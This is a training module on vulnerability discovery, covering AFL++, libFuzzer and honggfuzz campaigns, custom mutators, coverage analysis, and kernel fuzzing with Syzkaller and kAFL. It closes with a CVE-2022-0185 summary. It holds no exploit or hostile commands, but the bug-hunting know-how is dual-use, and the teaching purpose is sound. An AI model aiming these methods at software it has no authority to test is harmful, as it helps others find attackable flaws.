---
corso: "Cybersecurity Masterclass"
fase: "Domain 26 — Vulnerability Research and Exploit Development"
modulo: "26.1"
titolo: "Vulnerability Discovery"
versione: "AFL++ 4.x (FrameShift) / libFuzzer (LLVM 18) / Syzkaller 2025 / CodeQL 2.18 / Semgrep 1.x / Ghidra 11.x"
livello: "Advanced"
prerequisiti:
  - "C/C++ programming and memory-management concepts (heap, stack, pointers)"
  - "x86-64 architecture fundamentals (registers, calling conventions, instruction set)"
  - "Operating system internals (process model, virtual memory, syscalls)"
  - "Compiler toolchain familiarity (GCC, Clang/LLVM, build systems)"
  - "Basic reverse engineering concepts (disassembly, decompilation, control-flow graphs)"
obiettivi:
  - "Design and execute coverage-guided fuzzing campaigns with AFL++ (persistent mode, CmpLog, MOpt, custom mutators) and libFuzzer, achieving measurable code coverage against real-world targets"
  - "Configure and operate Syzkaller for Linux kernel fuzzing, including syzlang syscall descriptions, KCOV integration, and syz-repro crash minimization"
  - "Perform systematic manual code auditing for UAF, double-free, race conditions, integer overflow, and logic bugs using structured search patterns"
  - "Write and execute CodeQL taint-tracking queries for vulnerability-class variant analysis across large codebases, and Semgrep taint-mode rules for web application injection detection"
  - "Conduct binary auditing and 1-day patch-diff analysis using Ghidra, BinDiff, and Diaphora to identify security-relevant changes and assess exploitability"
tag: [security, vulnerability-research, fuzzing, afl, libfuzzer, syzkaller, codeql, semgrep, binary-auditing, patch-diffing, code-audit]
---

# Domain 26, Chapter 26A — Vulnerability Discovery

> **After completing this module, the student will be able to:**
>
> 1. Design and execute coverage-guided fuzzing campaigns with AFL++ (persistent mode, CmpLog, MOpt, custom mutators) and libFuzzer, achieving measurable code coverage against real-world targets.
> 2. Configure and operate Syzkaller for Linux kernel fuzzing, including syzlang syscall descriptions, KCOV integration, and syz-repro crash minimization.
> 3. Perform systematic manual code auditing for UAF, double-free, race conditions, integer overflow, and logic bugs using structured search patterns.
> 4. Write and execute CodeQL taint-tracking queries for vulnerability-class variant analysis across large codebases, and Semgrep taint-mode rules for web application injection detection.
> 5. Conduct binary auditing and 1-day patch-diff analysis using Ghidra, BinDiff, and Diaphora to identify security-relevant changes and assess exploitability.

> **Scope.** Coverage-guided fuzzing: AFL++ (fork server, shared-memory bitmap, edge-coverage feedback, QEMU mode, persistent mode, CmpLog, MOpt), libFuzzer (in-process, sanitizer integration). Structure-aware fuzzing: libprotobuf-mutator, custom mutators. Kernel fuzzing: syzkaller (syzlang, syz-manager, syz-repro, syz-extract), kAFL (Intel PT feedback). Code auditing: manual patterns for UAF, double-free, race conditions, integer overflow, logic bugs. Semantic static analysis: CodeQL (QL language, AST/dataflow libraries, taint tracking, query patterns), Semgrep (pattern syntax, metavariables, autofix). Binary auditing: Ghidra/IDA/Binary Ninja for vulnerability hunting (dangerous function identification, dataflow tracing, function-level analysis). Patch diffing: BinDiff, Diaphora for 1-day analysis. Vulnerability discovery program design: campaign planning, CVSS 4.0, responsible disclosure, bug bounty interaction.

---

## 1. Coverage-guided fuzzing

### 1.1 Fundamental concepts

Coverage-guided fuzzing (also called feedback-driven fuzzing) generates random inputs for a target program and uses code-coverage feedback to guide mutation toward unexplored code paths. The fuzzer maintains a corpus of inputs; each input that triggers new coverage (executing a previously-unseen edge in the control-flow graph) is saved to the corpus and becomes the basis for further mutation.

The coverage-guidance mechanism is what distinguishes modern fuzzing from "dumb" random testing: without feedback, the fuzzer generates inputs uniformly at random, rarely reaching deep code paths. With feedback, the fuzzer selectively preserves and mutates inputs that make progress toward new code, enabling systematic exploration of the program's input space.

### 1.2 AFL++ architecture

AFL++ (American Fuzzy Lop Plus Plus) is the most widely-used coverage-guided fuzzer, a community fork of Michał Zalewski's original AFL.

**Compile-time instrumentation.** When the target is compiled with `afl-clang-fast` (LLVM-based) or `afl-gcc` (GCC-based), the compiler inserts instrumentation at each basic-block edge: a lightweight operation that updates a shared-memory bitmap. The bitmap is a 64KB array indexed by a hash of the (source_block, destination_block) edge pair. Each byte in the bitmap represents a "hit count" bucket for that edge (hit counts are bucketed logarithmically: 1, 2, 3, 4–7, 8–15, 16–31, 32–127, 128+). A new non-zero byte in the bitmap indicates a new edge was covered; a new bucket value indicates a new hit-count category for an existing edge.

**The fork server.** AFL's performance optimization: instead of `execve()`-ing the target for every test case, AFL starts the target once and freezes it after initialization (after `main()` is entered but before the input is read). For each test case, the fork server `fork()`s the frozen process (inheriting all initialized state — loaded libraries, parsed configuration, allocated memory), the child processes the input and exits, and the fork server reports the coverage bitmap and exit status. Forking is much faster than `execve()` (avoiding dynamic linking, library loading, and initialization for each test case). Typical throughput: thousands to tens of thousands of executions per second.

**Persistent mode.** Even faster than the fork server: the target's input-processing function is called in a loop within a single process (no fork per test case). The target must be modified to reset state between iterations (or the target must be stateless). Persistent mode achieves 10–100× the throughput of fork-server mode.

**QEMU mode.** For binary-only targets (no source code): AFL++ uses QEMU's user-mode emulation to execute the target binary while collecting coverage feedback. QEMU's translation blocks are instrumented to update the AFL bitmap. Throughput is significantly lower than compile-time instrumentation (5–20× slowdown) but enables fuzzing of closed-source binaries.

**CmpLog (comparison logging).** A critical enhancement: AFL++ instruments comparison instructions (`cmp`, `memcmp`, `strcmp`, `switch`) to log the compared values. The fuzzer uses this information to overcome "magic byte" barriers: if the target compares the input against a constant (e.g., `if (header == 0xDEADBEEF)`), CmpLog captures the compared value and mutates the input to match. Without CmpLog, the fuzzer must randomly guess the correct 4-byte value (probability 2⁻³²).

**MOpt (Mutation Optimization).** AFL++ implements multiple mutation strategies (bitflip, byteflip, arithmetic increment/decrement, interesting values, havoc, splice). MOpt uses a particle-swarm optimization algorithm to dynamically adjust the probability of each mutation strategy based on its recent effectiveness (how many new coverage paths each strategy found). This adapts the fuzzer's mutation behavior to the target's input format.

**Power schedules.** AFL++ includes multiple power schedules (FAST, COE, EXPLORE, QUAD, LIN, RARE) that determine how much fuzzing time (how many mutations) to allocate to each corpus entry. The RARE schedule prioritizes inputs that exercise rare edges (edges hit by few corpus entries), focusing effort on under-explored code paths.

### 1.3 AFL++ environment variables deep dive

AFL++ exposes dozens of environment variables that control instrumentation, scheduling, mutator behavior, and performance. Mastering these is the difference between a naive campaign and one that finds bugs in hardened targets.

**`AFL_AUTORESUME`** tells AFL++ to resume an existing campaign in the output directory instead of aborting when the directory already exists. Without this, restarting a fuzzer node after a machine reboot or crash requires manual intervention. In CI pipelines and long-running infrastructure, this is always set.

**`AFL_MAP_SIZE`** overrides the default shared-memory bitmap size (64 KB). Targets with extremely large CFGs can saturate the default bitmap, causing hash collisions between distinct edges (coverage loss). Setting `AFL_MAP_SIZE=262144` (256 KB) reduces collision probability for targets with hundreds of thousands of edges (e.g., web browsers, language interpreters). The actual required size can be estimated during compilation: `afl-clang-fast` prints the number of instrumented edges. If the count exceeds ~50,000, increase the bitmap.

**`AFL_FAST_CAL`** skips extended calibration on new corpus entries. The default calibration executes each seed multiple times to estimate execution time and stability. For very large corpora (>100,000 seeds from OSS-Fuzz integration or previous campaigns), calibration can take hours. `AFL_FAST_CAL=1` reduces per-seed calibration runs from 8 to 3, halving startup time at the cost of slightly less accurate stability detection.

**`AFL_CMPLOG_ONLY_NEW`** instructs the CmpLog transformation pass to only apply input-to-state replacements when the fuzzer encounters a genuinely new coverage edge. Without this flag, CmpLog processes every test case through the comparison-logging binary, which is 2–5× slower than the normal instrumented binary. Setting this to 1 confines CmpLog overhead to the moments where it is most valuable — when a new edge is found and the fuzzer needs to solve the comparison constraints guarding the next frontier.

**`AFL_DISABLE_TRIM`** disables AFL++'s automatic test-case trimming. Trimming attempts to shrink each corpus entry while preserving its coverage, reducing overall corpus size and thus mutation time. However, for structured inputs (protocol buffers, serialized ASTs, compressed data), trimming can destroy structural validity — a trimmed input may no longer parse, losing coverage that depended on the intact structure. For targets with validated input formats, disabling trim and relying on manual corpus minimization (`afl-cmin`) is usually more effective.

**`AFL_IMPORT_FIRST`** makes AFL++ process imported seeds (from other fuzzer instances in parallel mode) before mutating its own queue entries. In a multi-node campaign where one instance runs with CmpLog and others run plain instrumentation, the CmpLog instance produces seeds that solve comparison barriers; `AFL_IMPORT_FIRST=1` on the non-CmpLog instances ensures they immediately benefit from those solutions rather than waiting until their queue naturally cycles to the imported entries.

**`AFL_CUSTOM_MUTATOR_LIBRARY`** loads a shared library containing a custom mutator (see §1.7). The library must export the AFL++ custom mutator API functions. Multiple custom mutator libraries can be chained by separating paths with colons.

A representative production launch combining these knobs:

```bash
# Primary instance with CmpLog
AFL_AUTORESUME=1 \
AFL_MAP_SIZE=262144 \
AFL_CMPLOG_ONLY_NEW=1 \
AFL_DISABLE_TRIM=1 \
  afl-fuzz -i corpus -o findings -M main \
    -c ./target_cmplog -m none -t 5000 \
    -p rare -- ./target_asan @@

# Secondary instance with custom mutator
AFL_AUTORESUME=1 \
AFL_MAP_SIZE=262144 \
AFL_IMPORT_FIRST=1 \
AFL_CUSTOM_MUTATOR_LIBRARY=/path/to/grammar_mutator.so \
  afl-fuzz -i corpus -o findings -S grammar01 \
    -m none -t 5000 \
    -p explore -- ./target_asan @@
```

### 1.4 Full AFL++ workflow: target selection through campaign execution

**Target selection.** Not all software is equally worth fuzzing. The researcher evaluates candidates based on several heuristics. Attack surface exposure is the primary criterion: code that processes untrusted input from the network (parsers, decoders, protocol handlers) has higher value than code that only processes local configuration files. Complexity is the second criterion: a 500-line JSON parser is less likely to contain bugs than a 200,000-line image codec with decades of accumulated format-specific logic. Historical vulnerability patterns provide signal: libraries that have had CVEs in the past (especially recent ones) often contain adjacent undiscovered bugs in related code paths. The NIST NVD, the project's own security advisories, and OSS-Fuzz's public dashboard all inform target selection.

**Harness construction.** Once the target is selected, the researcher writes a harness — a small program that reads fuzzer-generated input and feeds it to the target's parsing function. The harness must initialize any required state (opening databases, setting up contexts), call the target function with the fuzzer's input, and clean up. For persistent mode, the harness uses `__AFL_LOOP(N)` to process N inputs per fork cycle:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Target function to fuzz
extern int parse_image(const unsigned char *data, size_t len);

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    __AFL_INIT();
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;

    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        if (len < 4) continue;  // minimum viable input
        parse_image(buf, len);
    }
    return 0;
}
```

**Compilation with instrumentation and sanitizers.** The target is compiled twice: once with full instrumentation and ASan for the primary fuzzing binary, and once with CmpLog instrumentation for the comparison-logging binary. The CmpLog binary is never used as the primary execution target — it is only invoked when AFL++ needs to solve comparison constraints.

```bash
# Step 1: Standard instrumented build with ASan
CC=afl-clang-fast CXX=afl-clang-fast++ \
  CFLAGS="-g -O1 -fsanitize=address -fno-omit-frame-pointer" \
  CXXFLAGS="-g -O1 -fsanitize=address -fno-omit-frame-pointer" \
  ./configure --disable-shared
make -j$(nproc)
cp target target_asan

# Step 2: CmpLog build (separate binary, no ASan needed)
make clean
CC=afl-clang-fast CXX=afl-clang-fast++ \
  CFLAGS="-g -O1" CXXFLAGS="-g -O1" \
  AFL_LLVM_CMPLOG=1 \
  ./configure --disable-shared
make -j$(nproc)
cp target target_cmplog
```

**Initial corpus construction.** The corpus should contain small, structurally-valid inputs that collectively exercise different code paths. Sources include: the project's own test suite (`find tests/ -name "*.input" -o -name "*.test"`), format specification example files, prior corpus from OSS-Fuzz or previous campaigns, and manually-constructed edge cases (empty file, minimum-valid file, maximum-field-value file). The corpus should be minimized before fuzzing begins to remove redundant entries.

```bash
# Gather seeds
mkdir -p corpus/
cp test_suite/inputs/* corpus/
cp format_spec_examples/* corpus/

# Minimize: keep only inputs that contribute unique coverage
afl-cmin -i corpus/ -o corpus_min/ -- ./target_asan @@

# Further minimize individual test cases (reduce file size)
mkdir -p corpus_tmin/
for f in corpus_min/*; do
    afl-tmin -i "$f" -o "corpus_tmin/$(basename $f)" -- ./target_asan @@
done
```

### 1.5 Dictionary construction

Dictionaries provide the fuzzer with tokens (magic bytes, keywords, header fields) that appear in the target's input format. Without a dictionary, the fuzzer must discover these tokens through random mutation — which can take hours or never happen for multi-byte magic values.

**Automatic extraction via `AFL_LLVM_DICT2FILE`.** During compilation, AFL++ can extract string constants and comparison operands from the target's code and write them to a dictionary file:

```bash
AFL_LLVM_DICT2FILE=/tmp/auto.dict \
  afl-clang-fast -o /dev/null -c target.c
# /tmp/auto.dict now contains tokens extracted from string literals
# and comparison operands in the compiled code
```

**Manual dictionary format.** AFL++ dictionaries are plain text files with one token per line. Tokens can be specified as quoted strings or hex sequences:

```
# Image format dictionary
header_magic="PNG"
"\x89PNG\x0d\x0a\x1a\x0a"
"IHDR"
"IDAT"
"IEND"
"tEXt"
"zTXt"
"pHYs"
"\x00\x00\x00\x0d"
```

**Protocol-specific dictionaries.** AFL++ ships with dictionaries for common formats in its `dictionaries/` directory: HTTP, FTP, SMTP, XML, JSON, SQL, JavaScript, HTML, PDF, TIFF, GIF, PNG, and many others. For custom protocols, the researcher constructs the dictionary from the protocol specification, extracting field names, command keywords, status codes, and delimiter sequences.

The dictionary is passed to the fuzzer at launch:

```bash
afl-fuzz -i corpus -o findings -x /path/to/format.dict -- ./target @@
```

### 1.6 Custom mutator development

For targets with complex input formats where byte-level mutation is inefficient, AFL++ supports custom mutators loaded as shared libraries. The mutator implements structure-aware mutations that preserve format validity while mutating semantic content.

The custom mutator API requires implementing several functions. The following is a complete working example of a custom mutator for a simple key-value format:

```c
#include "afl-fuzz.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    afl_state_t *afl;
    uint8_t     *mutated_buf;
    size_t       mutated_size;
} mutator_state_t;

/* Called once at startup. Returns an opaque state pointer. */
void *afl_custom_init(afl_state_t *afl, unsigned int seed) {
    mutator_state_t *state = calloc(1, sizeof(mutator_state_t));
    state->afl = afl;
    state->mutated_buf = malloc(MAX_FILE);
    srand(seed);
    return state;
}

/* Core mutation function. Returns the size of the mutated buffer.
   buf: current input, buf_size: its length
   out_buf: pointer to the output buffer (set by the function)
   add_buf: an extra input from the queue for splicing
   max_size: maximum allowed output size */
size_t afl_custom_fuzz(void *data, uint8_t *buf, size_t buf_size,
                       uint8_t **out_buf, uint8_t *add_buf,
                       size_t add_buf_size, size_t max_size) {
    mutator_state_t *state = (mutator_state_t *)data;

    /* Copy original input */
    size_t out_size = buf_size < max_size ? buf_size : max_size;
    memcpy(state->mutated_buf, buf, out_size);

    /* Strategy: find '=' delimiters and mutate values after them */
    for (size_t i = 0; i < out_size; i++) {
        if (state->mutated_buf[i] == '=' && i + 1 < out_size) {
            /* Mutate the byte after '=' */
            state->mutated_buf[i + 1] = (uint8_t)(rand() % 256);
        }
    }

    /* Occasionally splice with the extra buffer */
    if (add_buf && add_buf_size > 0 && (rand() % 4) == 0) {
        size_t splice_at = rand() % out_size;
        size_t splice_len = add_buf_size < (out_size - splice_at)
                            ? add_buf_size : (out_size - splice_at);
        memcpy(state->mutated_buf + splice_at, add_buf, splice_len);
    }

    *out_buf = state->mutated_buf;
    return out_size;
}

/* Optional: post-process before writing to disk or sending to target.
   Useful for fixing checksums, updating length fields, etc. */
size_t afl_custom_post_process(void *data, uint8_t *buf, size_t buf_size,
                               uint8_t **out_buf) {
    /* Example: ensure input ends with newline */
    mutator_state_t *state = (mutator_state_t *)data;
    memcpy(state->mutated_buf, buf, buf_size);
    if (buf_size > 0 && state->mutated_buf[buf_size - 1] != '\n') {
        state->mutated_buf[buf_size] = '\n';
        buf_size++;
    }
    *out_buf = state->mutated_buf;
    return buf_size;
}

/* Cleanup. */
void afl_custom_deinit(void *data) {
    mutator_state_t *state = (mutator_state_t *)data;
    free(state->mutated_buf);
    free(state);
}
```

Compile the mutator as a shared library and load it:

```bash
gcc -shared -fPIC -o kv_mutator.so kv_mutator.c \
    -I /path/to/AFLplusplus/include
AFL_CUSTOM_MUTATOR_LIBRARY=./kv_mutator.so \
    afl-fuzz -i corpus -o findings -- ./target @@
```

### 1.7 libFuzzer advanced usage

**Corpus distillation with `-merge=1`.** Over time, a fuzzing corpus accumulates redundant entries — inputs whose coverage is a strict subset of other entries. The merge mode reads all inputs from one or more corpus directories, computes the minimal set that preserves total coverage, and writes the result:

```bash
# Merge two corpora into a minimal set
mkdir corpus_merged/
./fuzz_target -merge=1 corpus_merged/ corpus_a/ corpus_b/
# corpus_merged/ now contains the minimal covering set
```

This is essential for CI integration: the CI job loads the previous corpus, runs fuzzing for a time budget, then merges to keep the corpus small. A corpus that grows unbounded slows down future fuzzing runs because the fuzzer must calibrate and cycle through every entry.

**Parallel fuzzing with `-fork=N`.** libFuzzer can spawn N worker processes, each fuzzing independently with periodic corpus synchronization:

```bash
./fuzz_target -fork=8 -max_total_time=3600 corpus/
```

Each worker process writes new coverage-producing inputs to the shared corpus directory. The master process periodically merges the workers' findings. This achieves near-linear scaling on multi-core machines.

**Sanitizer option tuning.** ASan and MSan have runtime options that affect fuzzing performance and detection capability. These are set via environment variables:

```bash
# ASan: disable leak detection (noisy, not exploitable), keep other checks
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:\
  abort_on_error=1:symbolize=0:allocator_may_return_null=1"

# MSan: keep full origin tracking for actionable reports
export MSAN_OPTIONS="halt_on_error=1:abort_on_error=1:\
  origin_tracking=2:wrap_signals=0"

# UBSan: treat all UB as fatal
export UBSAN_OPTIONS="halt_on_error=1:abort_on_error=1:\
  print_stacktrace=1"
```

Setting `symbolize=0` disables inline symbolization during fuzzing (symbols are resolved only when analyzing crashes), improving throughput by 5–15%. Setting `allocator_may_return_null=1` prevents ASan from aborting on allocation failure — important for targets that intentionally allocate large buffers and handle failure gracefully.

### 1.8 Coverage analysis

Coverage analysis answers the question: what code has the fuzzer reached, and what remains unreachable?

**`afl-showmap`** executes a single input against the instrumented binary and prints the coverage bitmap in human-readable form (edge ID → hit count). This is useful for comparing two inputs to understand which one explores more code:

```bash
afl-showmap -o map_a.txt -- ./target < input_a
afl-showmap -o map_b.txt -- ./target < input_b
diff map_a.txt map_b.txt
```

**`afl-cov` for gcov integration.** For deeper coverage analysis (which source lines are covered, not just which edges), `afl-cov` instruments the target with gcov (`--coverage` flag), replays the fuzzer's queue against the gcov-instrumented binary, and generates lcov/HTML coverage reports:

```bash
# Build with gcov instrumentation (no AFL instrumentation, no sanitizers)
gcc --coverage -g -O0 -o target_gcov target.c

# Generate coverage report from AFL queue
afl-cov --afl-fuzzing-dir findings/ \
        --coverage-cmd "./target_gcov AFL_FILE" \
        --code-dir . \
        --output-dir cov_report/ \
        --lcov-web-all

# Open cov_report/web/index.html for source-annotated coverage
```

The HTML report highlights unreached code regions — these are the areas where the fuzzer is stuck and needs help (better seeds, dictionaries, custom mutators, or manual harness adjustment). Coverage plateaus after hours of fuzzing indicate either complete exploration (unlikely for complex targets) or a barrier the fuzzer cannot bypass (checksum validation, cryptographic checks, complex state machines).

### 1.9 Fuzzing infrastructure at scale

Individual fuzzer instances on a single machine find bugs. Production-scale vulnerability discovery requires infrastructure.

**ClusterFuzz** (Google) is the distributed fuzzing platform behind Chrome's and Android's security process. Its architecture separates concerns into scheduling (which targets to fuzz, how many cores to allocate), execution (running AFL++, libFuzzer, or other engines across thousands of VMs), corpus management (merging, minimizing, and distributing corpora across the fleet), crash processing (deduplication, bisection, test-case minimization, bug filing), and regression testing (running minimized test cases against new builds to detect fix regressions). ClusterFuzz is open-source and can be deployed on GCP or bare-metal clusters.

**OSS-Fuzz** is Google's free continuous-fuzzing service for open-source projects. A project integrates by providing: a `Dockerfile` that builds the project with fuzzing instrumentation, a `build.sh` that compiles fuzz targets using the environment's `$CC`, `$CXX`, and `$LIB_FUZZING_ENGINE`, and one or more fuzz target source files. OSS-Fuzz then runs these targets continuously on Google's infrastructure, reports bugs to the project's maintainers, and automatically verifies fixes. Over 1,000 open-source projects participate, and OSS-Fuzz has found over 40,000 bugs as of 2024.

A project integrates by adding three files under `projects/myproject/`: a `Dockerfile` (build environment), a `build.sh` (compilation using `$CC`, `$CXX`, `$LIB_FUZZING_ENGINE`), and a `project.yaml` (metadata: homepage, language, contact, engine selection, sanitizer selection).

**CI/CD fuzzing integration.** Even without ClusterFuzz, fuzzing integrates into CI pipelines. The pattern: a nightly job loads the corpus from artifact storage, runs the fuzzer for a fixed time budget (10–60 minutes), merges new findings into the corpus, stores the updated corpus, and fails the pipeline on crashes. This catches regressions and incrementally expands coverage over time.

### 1.10 Honggfuzz hardware performance counter configuration

Honggfuzz can use Intel hardware performance counters for coverage feedback instead of (or in addition to) compile-time instrumentation. This enables fuzzing closed-source binaries with better performance than QEMU-based approaches.

**Intel Processor Trace block coverage** (`--linux_perf_ipt_block`) uses Intel PT to trace executed basic blocks. This requires a CPU with Intel PT support (Broadwell and later) and kernel support (`CONFIG_PERF_EVENTS`, `CONFIG_INTEL_PT`). The overhead is approximately 5–15%, significantly less than QEMU's 500–2000%.

**Branch coverage** (`--linux_perf_branch`) uses the Last Branch Record (LBR) facility to count unique (source, destination) branch pairs. This is a lighter alternative to Intel PT with near-zero overhead but coarser coverage (it counts branches, not basic blocks).

**Persistent mode** in honggfuzz uses the `HF_ITER(uint8_t **buf, size_t *len)` macro. The harness calls `HF_ITER` in a loop; each call returns the next fuzzed input. Compile with `hfuzz-clang -fsanitize=address` and launch with `honggfuzz -i corpus/ --linux_perf_ipt_block --threads $(nproc) -- ./target_hfuzz`.

---

## 2. Kernel fuzzing

### 2.1 Syzkaller

Syzkaller (Google) is the dominant kernel fuzzer. It has discovered thousands of kernel bugs across Linux, FreeBSD, NetBSD, Windows, and Fuchsia.

**syzlang (syscall description language).** Syzkaller's input space is not raw bytes — it is sequences of syscalls with typed arguments. The syscall descriptions (stored in `.txt` files per subsystem) define: the syscall name, argument types (pointers to specific struct types, file descriptors, flags, buffer sizes, arrays), and relationships between arguments (e.g., "the `fd` argument to `write` must be a file descriptor returned by a previous `open`"). syzlang enables Syzkaller to generate valid syscall sequences that exercise deep kernel code paths, rather than immediately failing with `EINVAL`.

Example syzlang description:
```
open$proc(file ptr[in, string["/proc/self/maps"]], flags flags[open_flags]) fd
read(fd fd, buf buffer[out], count len[buf])
close(fd fd)
```

This describes: `open` a `/proc/self/maps` file (returns an fd), `read` from that fd into a buffer, `close` the fd. Syzkaller generates sequences of such descriptions with mutated arguments.

### 2.2 syzlang grammar in depth

syzlang is a typed description language that encodes not just syscall signatures but the semantic relationships between arguments and return values. Understanding its type system is essential for writing descriptions for new kernel subsystems.

**Scalar types** include `int8`/`int16`/`int32`/`int64` (unsigned), `intptr` (pointer-width), range annotations (`int32[0:4096]`), constants (`const[0x1234, int32]`), and flag sets (`flags[flag_set_name, int32]` selecting from separately-defined values).

**Pointer and buffer types.** `ptr[in, struct_name]` passes data userspace→kernel; `ptr[out, struct_name]` is for kernel→userspace output. `buffer[in]`/`buffer[out]` are raw data buffers. `string["/dev/net/tun"]` is a constant string; `string[filename]` generates interesting paths.

**Length and resource types.** `len[field_name]` auto-computes the byte length of the referenced field. `bytesize` and `bitsize` variants exist for struct fields and bit-counted fields. Resources model kernel objects with creation/consumption semantics: `fd` is the canonical example — `open(...)` returns `fd`, `read(fd fd, ...)` consumes it. Resources can be specialized (`fd_tun`, `sock_tcp`) to ensure valid handles.

**Struct definitions.** Structs define compound types with named fields:

```
sockaddr_in {
    family    const[AF_INET, int16]
    port      proc[int16be, 20000, 4]
    addr      ipv4_addr
    pad       array[const[0, int8], 8]
}

ipv4_addr [
    loopback  const[0x7f000001, int32be]
    random    int32be
    multicast int32be[0xe0000000:0xefffffff]
]
```

**Template arguments.** syzlang supports parameterized descriptions for groups of similar syscalls. The `$` prefix in syscall names (`open$tun`, `ioctl$TUNSETIFF`) specializes a generic syscall for a specific subsystem. Syzkaller's scheduler prioritizes generating programs that chain related specialized calls (e.g., `open$tun` followed by `ioctl$TUNSETIFF` on the returned fd).

### 2.3 syz-manager configuration

syz-manager is the orchestrator that manages VMs, distributes work, and processes results. Its JSON configuration file controls all aspects of the fuzzing campaign:

```json
{
    "target": "linux/amd64",
    "http": "127.0.0.1:56741",
    "workdir": "/home/fuzzer/syzkaller-workdir",
    "kernel_obj": "/home/fuzzer/linux/vmlinux",
    "image": "/home/fuzzer/images/bullseye.img",
    "sshkey": "/home/fuzzer/images/bullseye.id_rsa",
    "syzkaller": "/home/fuzzer/syzkaller",
    "procs": 8,
    "type": "qemu",
    "cover": true,
    "reproduce": true,
    "vm": {
        "count": 4,
        "kernel": "/home/fuzzer/linux/arch/x86/boot/bzImage",
        "cpu": 2,
        "mem": 2048,
        "cmdline": "net.ifnames=0"
    },
    "enable_syscalls": [
        "open$tun", "ioctl$TUNSETIFF", "write$tun",
        "read$tun", "close"
    ],
    "disable_syscalls": [
        "mount", "syz_mount_image"
    ]
}
```

The `target` field specifies OS and architecture. The `procs` field controls how many fuzzer processes run inside each VM (higher values increase throughput but also increase memory pressure and contention). The `vm.count` field sets the number of concurrent VMs. The `cover` field enables KCOV coverage collection (essential for coverage-guided fuzzing; disabling it reduces syz-manager to a blind stress tester). The `reproduce` field enables automatic crash reproduction via syz-repro.

The `enable_syscalls` and `disable_syscalls` arrays focus the fuzzer on specific subsystems. For targeted fuzzing of a particular driver or subsystem, enabling only its relevant syscalls dramatically improves coverage depth — the fuzzer does not waste time generating irrelevant syscall sequences that pollute the kernel's global state.

**syz-repro.** When syz-manager captures a crash (kernel panic, KASAN report, lockdep violation, hung task), syz-repro attempts to minimize the crashing program: it removes unnecessary syscalls, simplifies argument values, and identifies the minimal sequence that reliably triggers the crash. syz-repro produces a minimal C reproducer (`repro.c`) that can be compiled and run outside Syzkaller.

**KCOV.** The kernel's coverage-tracing mechanism (enabled by `CONFIG_KCOV`). KCOV records which kernel code is executed for each syscall, providing per-syscall coverage feedback to the fuzzer. Syzkaller uses KCOV to determine which syscall sequences explore new kernel code. KCOV also supports comparison tracing (`KCOV_ENABLE_CMP`), analogous to AFL++'s CmpLog — it records the operands of comparison instructions in kernel code, helping Syzkaller solve magic-value barriers in kernel parsers.

### 2.4 Kernel fuzzing methodology

**Subsystem selection.** Not all kernel subsystems are equally productive to fuzz. High-value targets include: networking (socket options, netfilter, packet processing — historically the highest bug density), filesystem implementations (especially less-tested ones: NTFS3, EROFS, FUSE), device drivers (USB, GPU, storage — complex state machines with limited testing), and security subsystems (LSM hooks, cgroup controllers, namespace operations). The researcher reviews recent CVEs for the target kernel version, identifies subsystems with active development (more churn = more bug potential), and prioritizes accordingly.

**Coverage analysis with kcov.** Beyond Syzkaller's built-in coverage tracking, the researcher can extract per-subsystem coverage statistics from syz-manager's web UI (exposed on the configured `http` port). The "cover" tab shows which kernel source files and functions have been reached. Functions with 0% coverage in a fuzzing-enabled subsystem indicate either missing syscall descriptions (the fuzzer cannot generate the right call sequence) or hard-to-reach code paths (requiring specific setup that the descriptions do not model).

**Reproducer minimization.** syz-repro's output is a starting point, not a final product. The researcher further minimizes by: removing setup syscalls that are not strictly necessary for the crash, replacing specific file descriptors with simpler equivalents, and simplifying struct field values. The goal is a reproducer that crashes reliably in under 5 seconds and is small enough to understand completely.

### 2.5 kAFL

kAFL (kernel-AFL) uses Intel Processor Trace (Intel PT) for hardware-assisted coverage feedback. Intel PT records the control-flow trace (taken/not-taken branches) of executed code with minimal overhead (< 5%). kAFL runs the target kernel in a QEMU/KVM VM; Intel PT captures the kernel's execution trace; the fuzzer decodes the trace to compute edge coverage.

kAFL's advantage: it works on any OS kernel (Linux, Windows, macOS) without source-code modifications or kernel-side instrumentation. The coverage feedback comes from the CPU hardware, not from kernel instrumentation. This enables fuzzing closed-source kernels (Windows kernel, proprietary hypervisors).

**kAFL setup.** kAFL uses QEMU-Nyx, a modified QEMU that supports Intel PT trace collection and snapshot-based fuzzing. The setup requires: a host kernel with Intel PT support (check `dmesg | grep "Intel PT"`), QEMU-Nyx built from the kAFL repository, and an agent binary running inside the guest VM that communicates with the fuzzer via hypercalls. The agent marks the beginning and end of the code region to fuzz (the "target range") using hypercall instructions, and the fuzzer collects Intel PT traces only within this range.

```bash
# Check Intel PT support
grep -c intel_pt /proc/cpuinfo
# Must be > 0

# kAFL launch (simplified)
kafl fuzz \
    --kernel /path/to/bzImage \
    --initrd /path/to/initrd.cpio.gz \
    --memory 512 \
    --work-dir /tmp/kafl_work \
    --seed-dir /path/to/seeds \
    --agent /path/to/agent.bin \
    -p 4
```

**Agent development.** The kAFL agent is a small program that runs inside the guest VM and feeds fuzzer-generated inputs to the kernel subsystem under test. For Linux kernel fuzzing, the agent typically opens a device file, performs an ioctl or write with the fuzzer's input, and signals completion. The agent uses kAFL hypercalls (`kAFL_hypercall(HYPERCALL_KAFL_ACQUIRE, ...)` and `kAFL_hypercall(HYPERCALL_KAFL_RELEASE, ...)`) to delimit the fuzzed region.

### 2.6 Real CVEs found by kernel fuzzers

Understanding how specific CVEs were discovered illustrates the methodology and its practical output.

**CVE-2022-0185: legacy_parse_param heap overflow.** Syzkaller discovered a heap buffer overflow in the Linux kernel's filesystem context subsystem. The function `legacy_parse_param()` in `fs/fs_context.c` allocated a buffer to hold a filesystem mount parameter but failed to account for the escape-sequence expansion: certain characters in the parameter value were expanded during processing, causing writes beyond the allocated buffer. The bug was reachable from an unprivileged user namespace via the `fsconfig()` syscall. Syzkaller's KASAN-enabled kernel detected the out-of-bounds write during a fuzz campaign targeting filesystem-related syscalls. The fix was a single bounds-check correction. CVSS 3.1: 8.4 (High).

